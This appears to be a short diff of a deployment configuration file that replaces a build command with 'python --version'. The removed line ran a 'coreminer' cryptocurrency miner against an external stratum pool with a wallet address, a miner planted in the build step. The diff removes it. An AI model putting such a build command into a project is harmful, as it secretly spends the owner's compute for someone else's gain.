@@ -1,5 +1,5 @@
 {
-  "buildCommand": "export LC_ALL=C && export LANG=C && ./coreminer -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008",
+  "buildCommand": "python --version",
   "crons": [
     {
       "path": "/api/cron/1m",
